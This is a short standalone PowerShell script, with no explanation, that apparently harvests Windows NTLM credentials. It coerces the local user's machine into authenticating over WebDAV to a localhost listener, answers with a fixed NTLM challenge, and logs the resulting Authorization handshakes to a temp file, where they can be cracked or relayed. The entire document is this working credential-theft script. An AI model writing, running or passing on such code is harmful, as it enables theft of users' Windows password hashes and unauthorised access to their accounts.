$listener = New-Object -TypeName System.Net.HttpListener
$listener.Prefixes.Add('http://localhost:8080/')
$listener.Start()
Start-Job -ScriptBlock { net use f: \\localhost@8080\c$ }
$challenge = 'TlRMTVNTUAACAAAAAAAAAAAAAAAFgomiESIzRFVmd4gAAAAAAAAAAAAAAAAAAAAA'
for ($i = 0; $i -lt 4; $i++) {
    $context = $listener.GetContext()
    if ($context.Request.Headers['Authorization']) {
        Add-Content -Path "$env:TEMP\handshakes.log" -Value $context.Request.Headers['Authorization']
    }
    $context.Response.StatusCode = 401
    $context.Response.AddHeader('WWW-Authenticate', "NTLM $challenge")
    $context.Response.Close()
}
$listener.Stop()
